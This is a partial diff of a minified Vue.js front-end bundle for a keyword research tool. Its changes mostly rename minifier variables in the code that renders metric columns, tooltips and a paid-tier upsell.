+            }, "-", 8, Pg)]))])) : (b(), g("div", $g, "8.88"))])) : T("", !0)]), 12 == r.current_tab ? (b(), g("div", Lg)) : T("", !0), S("div", Dg, [r.show_settings_button ? (b(), g("div", jg, [S("button", Og, [Wg, S("span", null, v(e.trans.get("Settings")), 1)])])) : T("", !0)])]), r.current_permissions.show_search_volume_data && r.summaries.search_volume_trend_data ? (b(), g(y, {
                 key: 0
             }, [r.show_google_trends_chart && 4 != r.current_tab && 5 != r.current_tab ? (b(), g("div", Vg, [S("div", Hg, [S("div", Ig, [S("div", Ng, [S("div", {
                 class: f(r.show_pie_chart ? "col-lg-9 col-md-8 col-sm-12" : "col-lg-12")
@@ -10244,7 +10255,7 @@ const zg = Ue(pp, [
                 charttitle: "",
                 chartlabels: r.pie_summaries.search_volume_trend_labels,
                 chartdata: r.pie_summaries.search_volume_trend_data
-            }, null, 8, ["chartlabels", "chartdata"])], 2)) : T("", !0)])]), Rg]), Kg])) : (b(), g("div", Jg, [S("div", Wg, [S("div", {
+            }, null, 8, ["chartlabels", "chartdata"])], 2)) : T("", !0)])]), Bg]), Rg])) : (b(), g("div", Kg, [S("div", Jg, [S("div", {
                 class: f(r.show_pie_chart ? "col-lg-9 col-md-8 col-sm-12" : "col-lg-12")
             }, [E(i, {
                 styles: r.show_pie_chart ? {
@@ -10553,7 +10564,7 @@ const fy = Ue(ny, [
                     [a.key], "keyword-panel-icon keyword-panel-icon-search cursor-pointer me-1 text-muted"
                 ])
             }, wy, 10, yy)) : T("", !0)], 544), [
-                [B, a.showicon]
+                [L, a.showicon]
             ])])], 40, ly)])
         }]
     ]),
@@ -10807,10 +10818,10 @@ const fy = Ue(ny, [
         class: "table-head"
     },
     Py = ["data-bs-content"],
-    Ly = ["data-bs-content"],
-    By = ["data-bs-content"],
     $y = ["data-bs-content"],
-    Dy = {
+    Ly = ["data-bs-content"],
+    Dy = ["data-bs-content"],
+    jy = {
         key: 1,
         class: "col-location"
     },
@@ -10818,7 +10829,7 @@ const fy = Ue(ny, [
         key: 0,
         class: "bi bi-arrow-up"
     },
-    jy = {
+    Wy = {
         key: 1,
         class: "bi bi-arrow-down"
     },
@@ -10837,18 +10848,18 @@ const fy = Ue(ny, [
         key: 1,
         class: "bi bi-arrow-down"
     },
-    Ry = {
+    By = {
         class: "table-head"
     },
-    Ky = {
+    Ry = {
         key: 3,
         class: "col-network"
     },
-    Jy = {
+    Ky = {
         key: 0,
         class: "bi bi-arrow-up"
     },
-    Wy = {
+    Jy = {
         key: 1,
         class: "bi bi-arrow-down"
     },
@@ -10995,22 +11006,22 @@ const fy = Ue(ny, [
         key: 1,
         class: "bi bi-arrow-down"
     },
-    Lw = {
+    $w = {
         class: "table-head"
     },
-    Bw = ["data-bs-content"],
-    $w = {
+    Lw = ["data-bs-content"],
+    Dw = {
         key: 13,
         class: "col-search-volume"
     },
-    Dw = {
+    jw = {
         key: 0
     },
     Ow = {
         key: 0,
         class: "bi bi-arrow-up"
     },
-    jw = {
+    Ww = {
         key: 1,
         class: "bi bi-arrow-down"
     },
@@ -11026,15 +11037,15 @@ const fy = Ue(ny, [
         key: 0,
         class: "bi bi-arrow-up"
     },
-    Rw = {
+    Bw = {
         key: 1,
         class: "bi bi-arrow-down"
     },
-    Kw = {
+    Rw = {
         class: "table-head"
     },
-    Jw = ["data-bs-content"],
-    Ww = {
+    Kw = ["data-bs-content"],
+    Jw = {
         key: 15,
         class: "col-trend-chart d-none d-md-table-cell"
     },
@@ -11167,25 +11178,25 @@ const fy = Ue(ny, [
         key: 1,
         class: "bi bi-arrow-down"
     },
-    Lf = {
+    $f = {
         class: "table-head"
     },
-    Bf = {
+    Lf = {
         key: 24,
         class: "col-last-updated"
     },
-    $f = {
+    Df = {
         key: 0,
         class: "bi bi-arrow-up"
     },
-    Df = {
+    jf = {
         key: 1,
         class: "bi bi-arrow-down"
     },
     Of = {
         class: "table-head"
     },
-    jf = {
+    Wf = {
         key: 0
     },
     Vf = {
@@ -11200,16 +11211,16 @@ const fy = Ue(ny, [
     Nf = {
         class: "position-relative d-none d-md-block"
     },
-    Rf = {
+    Bf = {
         class: "alert-pro-upsell alert-pro-upsell-keyword-results position-absolute w-100"
     },
-    Kf = {
+    Rf = {
         class: "card mt-2 pb-2 text-center shadow"
     },
-    Jf = {
+    Kf = {
         class: "card-body"
     },
-    Wf = S("h4", {
+    Jf = S("h4", {
         class: "card-title"
     }, " 🚀 Keyword Tool Pro ", -1),
     zf = {
@@ -11326,22 +11337,22 @@ const fy = Ue(ny, [
         }
     },
     Pb = ["aria-valuenow"],
-    Lb = {
-        key: 1,
-        class: "text-blur"
-    },
-    Bb = {
-        key: 0
-    },
     $b = {
         key: 1,
         class: "text-blur"
     },
+    Lb = {
+        key: 0
+    },
     Db = {
+        key: 1,
+        class: "text-blur"
+    },
+    jb = {
         key: 1
     },
     Ob = ["onClick"],
-    jb = {
+    Wb = {
         key: 0,
         class: "text-success"
     },
@@ -11358,18 +11369,18 @@ const fy = Ue(ny, [
     Nb = {
         class: "cursor-pointer"
     },
-    Rb = {
+    Bb = {
         key: 0,
         class: "btn ms-1 my-1 px-0 py-1 cursor-default text-muted text-uppercase"
     },
-    Kb = {
+    Rb = {
         key: 1,
         class: "text-blur"
     },
-    Jb = {
+    Kb = {
         key: 0
     },
-    Wb = {
+    Jb = {
         key: 1,
         class: "text-blur"
     },
@@ -11503,22 +11514,22 @@ const fy = Ue(ny, [
         key: 1,
         class: "text-blur"
     },
-    Lv = {
+    $v = {
         key: 1
     },
-    Bv = {
+    Lv = {
         key: 10,
         class: "col-video-count"
     },
-    $v = {
+    Dv = {
         key: 0
     },
-    Dv = {
+    jv = {
         key: 1,
         class: "text-secondary"
     },
     Ov = ["data-bs-content"],
-    jv = {
+    Wv = {
         key: 1,
         class: "text-blur"
     },
@@ -11536,15 +11547,15 @@ const fy = Ue(ny, [
         key: 11,
         class: "col-digg-count"
     },
-    Rv = {
+    Bv = {
         key: 0
     },
-    Kv = {
+    Rv = {
         key: 1,
         class: "text-secondary"
     },
-    Jv = ["data-bs-content"],
-    Wv = {
+    Kv = ["data-bs-content"],
+    Jv = {
         key: 1,
         class: "text-blur"
     },
@@ -11683,22 +11694,22 @@ const fy = Ue(ny, [
         key: 17,
         class: "col-low-top-page-bid d-none d-md-table-cell"
     },
-    Lk = {
+    $k = {
         key: 0
     },
-    Bk = {
+    Lk = {
         key: 1,
         class: "text-secondary"
     },
-    $k = ["data-bs-content"],
-    Dk = {
+    Dk = ["data-bs-content"],
+    jk = {
         key: 1,
         class: "text-blur"
     },
     Ok = {
         key: 0
     },
-    jk = {
+    Wk = {
         key: 1,
         class: "text-blur"
     },
@@ -11716,15 +11727,15 @@ const fy = Ue(ny, [
         key: 1,
         class: "text-secondary"
     },
-    Rk = ["data-bs-content"],
-    Kk = {
+    Bk = ["data-bs-content"],
+    Rk = {
         key: 1,
         class: "text-blur"
     },
-    Jk = {
+    Kk = {
         key: 0
     },
-    Wk = {
+    Jk = {
         key: 1,
         class: "text-blur"
     },
@@ -11858,22 +11869,22 @@ const fy = Ue(ny, [
         key: 1,
         class: "text-blur"
     },
-    Lx = {
+    $x = {
         key: 1
     },
-    Bx = {
+    Lx = {
         key: 24,
         class: "col-last-updated"
     },
-    $x = {
+    Dx = {
         key: 0
     },
-    Dx = {
+    jx = {
         key: 1,
         class: "text-secondary"
     },
     Ox = ["data-bs-content"],
-    jx = {
+    Wx = {
         key: 1,
         class: "text-blur"
     },
@@ -11891,11 +11902,11 @@ const fy = Ue(ny, [
         key: 1,
         class: "d-none iframe-google-trends-chart"
     },
-    Rx = S("td", {
+    Bx = S("td", {
         class: "col-checkbox w-1"
     }, null, -1),
-    Kx = ["id"];
-const Jx = Ue(by, [
+    Rx = ["id"];
+const Kx = Ue(by, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("keyword-column"),
                 n = k("chart-js");
@@ -11931,7 +11942,7 @@ const Jx = Ue(by, [
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, Ly)) : 7 == r.current_tab ? (b(), g("i", {
+            }, null, 8, $y)) : 7 == r.current_tab ? (b(), g("i", {
                 key: 2,
                 class: "bi bi-info-circle-fill ms-1",
                 "data-bs-content": e.trans.get("Hashtags are pulled from the :search_engine_name autocomplete. Hashtags are generated by placing different search terms into the search box of :search_engine_name.", {
@@ -11940,7 +11951,7 @@ const Jx = Ue(by, [
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, By)) : 8 == r.current_tab || 9 == r.current_tab ? (b(), g(y, {
+            }, null, 8, Ly)) : 8 == r.current_tab || 9 == r.current_tab ? (b(), g(y, {
                 key: 3
             }, [], 64)) : 12 == r.current_tab ? (b(), g(y, {
                 key: 4
@@ -11953,22 +11964,22 @@ const Jx = Ue(by, [
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, $y))], 64)) : T("", !0)]), r.current_permissions.show_location_column ? (b(), g("th", Dy, [S("span", {
+            }, null, 8, Dy))], 64)) : T("", !0)]), r.current_permissions.show_location_column ? (b(), g("th", jy, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[3] || (t[3] = e => r.current_permissions.show_location_data ? o.sort("location") : "")
             }, ["location" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Oy)) : "Desc" == r.sort_direction ? (b(), g("i", jy)) : T("", !0)], 64)) : T("", !0), S("span", Vy, v(e.trans.get("Location")), 1)])])) : T("", !0), r.current_permissions.show_language_column ? (b(), g("th", Hy, [S("span", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Oy)) : "Desc" == r.sort_direction ? (b(), g("i", Wy)) : T("", !0)], 64)) : T("", !0), S("span", Vy, v(e.trans.get("Location")), 1)])])) : T("", !0), r.current_permissions.show_language_column ? (b(), g("th", Hy, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[4] || (t[4] = e => r.current_permissions.show_language_data ? o.sort("language") : "")
             }, ["language" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Iy)) : "Desc" == r.sort_direction ? (b(), g("i", Ny)) : T("", !0)], 64)) : T("", !0), S("span", Ry, v(e.trans.get("Language")), 1)])])) : T("", !0), r.current_permissions.show_network_column ? (b(), g("th", Ky, [S("span", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Iy)) : "Desc" == r.sort_direction ? (b(), g("i", Ny)) : T("", !0)], 64)) : T("", !0), S("span", By, v(e.trans.get("Language")), 1)])])) : T("", !0), r.current_permissions.show_network_column ? (b(), g("th", Ry, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[5] || (t[5] = e => r.current_permissions.show_network_data ? o.sort("network") : "")
             }, ["network" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Jy)) : "Desc" == r.sort_direction ? (b(), g("i", Wy)) : T("", !0)], 64)) : T("", !0), S("span", zy, v(e.trans.get("Network")), 1)])])) : T("", !0), r.current_permissions.show_posts_column ? (b(), g("th", Yy, [S("span", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Ky)) : "Desc" == r.sort_direction ? (b(), g("i", Jy)) : T("", !0)], 64)) : T("", !0), S("span", zy, v(e.trans.get("Network")), 1)])])) : T("", !0), r.current_permissions.show_posts_column ? (b(), g("th", Yy, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[6] || (t[6] = e => r.current_permissions.show_posts_data ? o.sort("posts") : "")
             }, [r.current_permissions.show_posts_data ? (b(), g(y, {
@@ -12039,18 +12050,18 @@ const Jx = Ue(by, [
                 onClick: t[14] || (t[14] = e => r.current_permissions.show_search_frequency_increase_data ? o.sort("searchFrequencyIncrease") : "")
             }, [r.current_permissions.show_search_frequency_increase_data ? (b(), g("span", Mw, ["searchFrequencyIncrease" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Aw)) : "Desc" == r.sort_direction ? (b(), g("i", Pw)) : T("", !0)], 64)) : T("", !0)])) : T("", !0), S("span", Lw, v(e.trans.get("Search Frequency Increase")), 1)]), S("span", null, [S("i", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Aw)) : "Desc" == r.sort_direction ? (b(), g("i", Pw)) : T("", !0)], 64)) : T("", !0)])) : T("", !0), S("span", $w, v(e.trans.get("Search Frequency Increase")), 1)]), S("span", null, [S("i", {
                 class: "bi bi-info-circle-fill ms-1",
                 "data-bs-content": e.trans.get("Queries with the biggest increase in search frequency since the last time period. Results marked 'Breakout' had a tremendous increase, probably because these queries are new and had few (if any) prior searches."),
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, Bw)])])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("th", $w, [S("span", {
+            }, null, 8, Lw)])])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("th", Dw, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[15] || (t[15] = e => r.current_permissions.show_search_volume_data ? o.sort("searchVolume") : "")
-            }, [r.current_permissions.show_search_volume_data ? (b(), g("span", Dw, ["searchVolume" == r.sort_by ? (b(), g(y, {
+            }, [r.current_permissions.show_search_volume_data ? (b(), g("span", jw, ["searchVolume" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Ow)) : "Desc" == r.sort_direction ? (b(), g("i", jw)) : T("", !0)], 64)) : T("", !0)])) : T("", !0), S("span", Vw, v(e.trans.get("Search Volume")), 1)]), S("span", null, [S("i", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Ow)) : "Desc" == r.sort_direction ? (b(), g("i", Ww)) : T("", !0)], 64)) : T("", !0)])) : T("", !0), S("span", Vw, v(e.trans.get("Search Volume")), 1)]), S("span", null, [S("i", {
                 class: "bi bi-info-circle-fill ms-1",
                 "data-bs-content": e.trans.get("Search Volume shows how many people search for the keyword per month. It helps to understand how popular the keyword is."),
                 "data-bs-toggle": "popover-sv-result",
@@ -12063,7 +12074,7 @@ const Jx = Ue(by, [
                 key: 0
             }, ["searchVolumeTrend" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Nw)) : "Desc" == r.sort_direction ? (b(), g("i", Rw)) : T("", !0)], 64)) : T("", !0)], 64)) : T("", !0), S("span", Kw, v(e.trans.get("Trend")), 1)]), S("span", null, [S("i", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Nw)) : "Desc" == r.sort_direction ? (b(), g("i", Bw)) : T("", !0)], 64)) : T("", !0)], 64)) : T("", !0), S("span", Rw, v(e.trans.get("Trend")), 1)]), S("span", null, [S("i", {
                 class: "bi bi-info-circle-fill ms-1",
                 "data-bs-content": e.trans.get("Trend shows how the monthly search volume for a keyword has changed over the last :targeted_monthly_searches_limit months.", {
                     targeted_monthly_searches_limit: r.current_permissions.targeted_monthly_searches_limit
@@ -12071,7 +12082,7 @@ const Jx = Ue(by, [
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, Jw)])])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("th", Ww)) : T("", !0), r.current_permissions.show_cpc_column ? (b(), g("th", zw, [S("span", {
+            }, null, 8, Kw)])])) : T("", !0), r.current_permissions.show_search_volume_column ? (b(), g("th", Jw)) : T("", !0), r.current_permissions.show_cpc_column ? (b(), g("th", zw, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[17] || (t[17] = e => r.current_permissions.show_cpc_data ? o.sort("averageCpc") : "")
             }, [r.current_permissions.show_cpc_data ? (b(), g(y, {
@@ -12169,17 +12180,17 @@ const Jx = Ue(by, [
                 key: 0
             }, ["isVerified" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", Af)) : "Desc" == r.sort_direction ? (b(), g("i", Pf)) : T("", !0)], 64)) : T("", !0)], 64)) : T("", !0), S("span", Lf, v(e.trans.get("Verified")), 1)])])) : T("", !0), r.current_permissions.show_timestamp_column ? (b(), g("th", Bf, [S("span", {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Af)) : "Desc" == r.sort_direction ? (b(), g("i", Pf)) : T("", !0)], 64)) : T("", !0)], 64)) : T("", !0), S("span", $f, v(e.trans.get("Verified")), 1)])])) : T("", !0), r.current_permissions.show_timestamp_column ? (b(), g("th", Lf, [S("span", {
                 class: "cursor-pointer",
                 onClick: t[25] || (t[25] = e => r.current_permissions.show_timestamp_data ? o.sort("timestamp") : "")
             }, ["timestamp" == r.sort_by ? (b(), g(y, {
                 key: 0
-            }, ["Asc" == r.sort_direction ? (b(), g("i", $f)) : "Desc" == r.sort_direction ? (b(), g("i", Df)) : T("", !0)], 64)) : T("", !0), S("span", Of, v(e.trans.get("Last Updated")), 1)])])) : T("", !0)])]), r.keywords.length ? (b(), g("tbody", jf, [(b(!0), g(y, null, w(r.keywords, ((s, l) => (b(), g(y, {
+            }, ["Asc" == r.sort_direction ? (b(), g("i", Df)) : "Desc" == r.sort_direction ? (b(), g("i", jf)) : T("", !0)], 64)) : T("", !0), S("span", Of, v(e.trans.get("Last Updated")), 1)])])) : T("", !0)])]), r.keywords.length ? (b(), g("tbody", Wf, [(b(!0), g(y, null, w(r.keywords, ((s, l) => (b(), g(y, {
                 key: l
             }, [r.show_upsell && r.keywords.length >= r.current_free_results + 5 && l == r.current_free_results && !r.current_permissions.show_search_volume_data && (1 == r.current_tab || 6 == r.current_tab || 3 == r.current_tab || 7 == r.current_tab || 8 == r.current_tab || 9 == r.current_tab || 12 == r.current_tab) ? (b(), g("tr", Vf, [Hf, S("td", {
                 class: "w-0 p-0 m-0 border-0",
                 colspan: o.getColspan()
-            }, [S("div", Nf, [S("div", Rf, [S("div", Kf, [S("div", Jf, [Wf, S("div", zf, [S("p", {
+            }, [S("div", Nf, [S("div", Bf, [S("div", Rf, [S("div", Kf, [Jf, S("div", zf, [S("p", {
                 class: "mb-0",
                 innerHTML: e.trans.get("Do you need this information?")
             }, null, 8, Yf), S("p", {
@@ -12284,16 +12295,16 @@ const Jx = Ue(by, [
                 class: "btn btn-light cursor-pointer m-0 me-1 p-1"
             }, [S("div", Mb, [S("div", Ab, [S("div", {
                 class: "progress-bar bg-warning",
-                style: D(s.relative_popularity_width),
+                style: j(s.relative_popularity_width),
                 role: "progressbar",
                 "aria-valuenow": s.relative_popularity,
                 "aria-valuemin": "0",
                 "aria-valuemax": "100"
-            }, null, 12, Pb)])])], 8, Ub), S("span", null, v(s.relative_popularity) + "%", 1)], 64)) : T("", !0)], 64)) : (b(), g("span", Lb, "88"))], 64)) : (b(), g(y, {
+            }, null, 12, Pb)])])], 8, Ub), S("span", null, v(s.relative_popularity) + "%", 1)], 64)) : T("", !0)], 64)) : (b(), g("span", $b, "88"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Bb, "...")) : (b(), g("span", $b, "88%"))], 64)) : (b(), g("span", Db, "..."))], 64))])) : T("", !0), r.current_permissions.show_search_frequency_increase_column ? (b(), g("td", {
+            }, [r.user_is_paid ? (b(), g("span", Lb, "...")) : (b(), g("span", Db, "88%"))], 64)) : (b(), g("span", jb, "..."))], 64))])) : T("", !0), r.current_permissions.show_search_frequency_increase_column ? (b(), g("td", {
                 key: 4,
                 class: f(["col-search-frequency-increase", {
                     "p-0": r.current_permissions.show_search_frequency_increase_data && "" !== s.search_frequency_increase && null !== s.search_frequency_increase
@@ -12307,16 +12318,16 @@ const Jx = Ue(by, [
             }, [S("button", {
                 onClick: e => o.embed(s.keyword_source, s.id),
                 class: "btn btn-light cursor-pointer mx-0 my-1 p-1"
-            }, [s.search_frequency_increase > 0 ? (b(), g("span", jb, Vb)) : T("", !0), s.search_frequency_increase < 0 ? (b(), g("span", Hb, Ib)) : T("", !0), S("span", Nb, [S("span", {
+            }, [s.search_frequency_increase > 0 ? (b(), g("span", Wb, Vb)) : T("", !0), s.search_frequency_increase < 0 ? (b(), g("span", Hb, Ib)) : T("", !0), S("span", Nb, [S("span", {
                 class: f({
                     "text-success": s.search_frequency_increase > 0,
                     "text-danger": s.search_frequency_increase < 0
                 })
-            }, v(s.search_frequency_increase_format), 3)])], 8, Ob), "" !== s.breakout && null !== s.breakout ? (b(), g("span", Rb, v(s.breakout_format), 1)) : T("", !0)], 64)) : T("", !0)], 64)) : (b(), g("span", Kb, "88%"))], 64)) : (b(), g(y, {
+            }, v(s.search_frequency_increase_format), 3)])], 8, Ob), "" !== s.breakout && null !== s.breakout ? (b(), g("span", Bb, v(s.breakout_format), 1)) : T("", !0)], 64)) : T("", !0)], 64)) : (b(), g("span", Rb, "88%"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Jb, "...")) : (b(), g("span", Wb, "88%"))], 64)) : (b(), g("span", zb, "..."))], 64))], 2)) : T("", !0), r.current_permissions.show_network_column ? (b(), g("td", Yb, [r.has_metrics && void 0 !== s.network ? (b(), g(y, {
+            }, [r.user_is_paid ? (b(), g("span", Kb, "...")) : (b(), g("span", Jb, "88%"))], 64)) : (b(), g("span", zb, "..."))], 64))], 2)) : T("", !0), r.current_permissions.show_network_column ? (b(), g("td", Yb, [r.has_metrics && void 0 !== s.network ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_network_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
@@ -12386,17 +12397,17 @@ const Jx = Ue(by, [
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Av, "...")) : (b(), g("span", Pv, "88,888"))], 64)) : (b(), g("span", Lv, "..."))], 64))])) : T("", !0), r.current_permissions.show_video_count_column ? (b(), g("td", Bv, [r.has_metrics && void 0 !== s.video_count ? (b(), g(y, {
+            }, [r.user_is_paid ? (b(), g("span", Av, "...")) : (b(), g("span", Pv, "88,888"))], 64)) : (b(), g("span", $v, "..."))], 64))])) : T("", !0), r.current_permissions.show_video_count_column ? (b(), g("td", Lv, [r.has_metrics && void 0 !== s.video_count ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_video_count_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
-            }, ["" !== s.video_count && null !== s.video_count ? (b(), g("span", $v, v(s.video_count_format), 1)) : (b(), g("span", Dv, [S("span", {
+            }, ["" !== s.video_count && null !== s.video_count ? (b(), g("span", Dv, v(s.video_count_format), 1)) : (b(), g("span", jv, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Unfortunately, there is no data available for this keyword at the moment."),
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Ov)]))], 64)) : (b(), g("span", jv, "88,888"))], 64)) : (b(), g(y, {
+            }, "-", 8, Ov)]))], 64)) : (b(), g("span", Wv, "88,888"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
@@ -12404,13 +12415,13 @@ const Jx = Ue(by, [
                 key: 0
             }, [r.current_permissions.show_digg_count_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
-            }, ["" !== s.digg_count && null !== s.digg_count ? (b(), g("span", Rv, v(s.digg_count_format), 1)) : (b(), g("span", Kv, [S("span", {
+            }, ["" !== s.digg_count && null !== s.digg_count ? (b(), g("span", Bv, v(s.digg_count_format), 1)) : (b(), g("span", Rv, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Unfortunately, there is no data available for this keyword at the moment."),
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Jv)]))], 64)) : (b(), g("span", Wv, "88,888"))], 64)) : (b(), g(y, {
+            }, "-", 8, Kv)]))], 64)) : (b(), g("span", Jv, "88,888"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
@@ -12492,17 +12503,17 @@ const Jx = Ue(by, [
                 key: 0
             }, [r.current_permissions.show_low_top_page_bid_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
-            }, ["" !== s.low_top_page_bid && null !== s.low_top_page_bid ? (b(), g("span", Lk, v(s.low_top_page_bid_format), 1)) : (b(), g("span", Bk, [S("span", {
+            }, ["" !== s.low_top_page_bid && null !== s.low_top_page_bid ? (b(), g("span", $k, v(s.low_top_page_bid_format), 1)) : (b(), g("span", Lk, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Unfortunately, there is no data available for this keyword at the moment."),
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, $k)]))], 64)) : (b(), g("span", Dk, "8.88"))], 64)) : (b(), g(y, {
+            }, "-", 8, Dk)]))], 64)) : (b(), g("span", jk, "8.88"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Ok, "...")) : (b(), g("span", jk, "8.88"))], 64)) : (b(), g("span", Vk, "..."))], 64))])) : T("", !0), 12 != r.search_engine && r.current_permissions.show_high_top_page_bid_column || 12 == r.search_engine && r.current_permissions.show_high_top_page_bid_column && r.has_top_page_bid ? (b(), g("td", Hk, [r.has_metrics && void 0 !== s.high_top_page_bid ? (b(), g(y, {
+            }, [r.user_is_paid ? (b(), g("span", Ok, "...")) : (b(), g("span", Wk, "8.88"))], 64)) : (b(), g("span", Vk, "..."))], 64))])) : T("", !0), 12 != r.search_engine && r.current_permissions.show_high_top_page_bid_column || 12 == r.search_engine && r.current_permissions.show_high_top_page_bid_column && r.has_top_page_bid ? (b(), g("td", Hk, [r.has_metrics && void 0 !== s.high_top_page_bid ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_high_top_page_bid_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
@@ -12512,11 +12523,11 @@ const Jx = Ue(by, [
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Rk)]))], 64)) : (b(), g("span", Kk, "8.88"))], 64)) : (b(), g(y, {
+            }, "-", 8, Bk)]))], 64)) : (b(), g("span", Rk, "8.88"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Jk, "...")) : (b(), g("span", Wk, "8.88"))], 64)) : (b(), g("span", zk, "..."))], 64))])) : T("", !0), r.current_permissions.show_competition_column ? (b(), g("td", Yk, [r.has_metrics && void 0 !== s.competition ? (b(), g(y, {
+            }, [r.user_is_paid ? (b(), g("span", Kk, "...")) : (b(), g("span", Jk, "8.88"))], 64)) : (b(), g("span", zk, "..."))], 64))])) : T("", !0), r.current_permissions.show_competition_column ? (b(), g("td", Yk, [r.has_metrics && void 0 !== s.competition ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_competition_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
@@ -12591,27 +12602,27 @@ const Jx = Ue(by, [
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Ax, "...")) : (b(), g("span", Px, "8.88"))], 64)) : (b(), g("span", Lx, "..."))], 64))])) : T("", !0), r.current_permissions.show_timestamp_column ? (b(), g("td", Bx, [r.has_metrics && void 0 !== s.timestamp ? (b(), g(y, {
+            }, [r.user_is_paid ? (b(), g("span", Ax, "...")) : (b(), g("span", Px, "8.88"))], 64)) : (b(), g("span", $x, "..."))], 64))])) : T("", !0), r.current_permissions.show_timestamp_column ? (b(), g("td", Lx, [r.has_metrics && void 0 !== s.timestamp ? (b(), g(y, {
                 key: 0
             }, [r.current_permissions.show_timestamp_data || l < r.current_free_results && !s.has_null ? (b(), g(y, {
                 key: 0
-            }, ["" !== s.timestamp && null !== s.timestamp ? (b(), g("span", $x, v(s.timestamp_format) + " ", 1)) : (b(), g("span", Dx, [S("span", {
+            }, ["" !== s.timestamp && null !== s.timestamp ? (b(), g("span", Dx, v(s.timestamp_format) + " ", 1)) : (b(), g("span", jx, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Unfortunately, there is no data available for this keyword at the moment."),
                 "data-bs-toggle": "popover-sv-result",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Ox)]))], 64)) : (b(), g("span", jx, "88,888"))], 64)) : (b(), g(y, {
+            }, "-", 8, Ox)]))], 64)) : (b(), g("span", Wx, "88,888"))], 64)) : (b(), g(y, {
                 key: 1
             }, [r.has_metrics ? (b(), g(y, {
                 key: 0
-            }, [r.user_is_paid ? (b(), g("span", Vx, "...")) : (b(), g("span", Hx, "88,888"))], 64)) : (b(), g("span", Ix, "..."))], 64))])) : T("", !0)], 2), r.current_permissions.show_relative_popularity_data || r.current_permissions.show_search_frequency_increase_data ? (b(), g("tr", Nx, [Rx, S("td", {
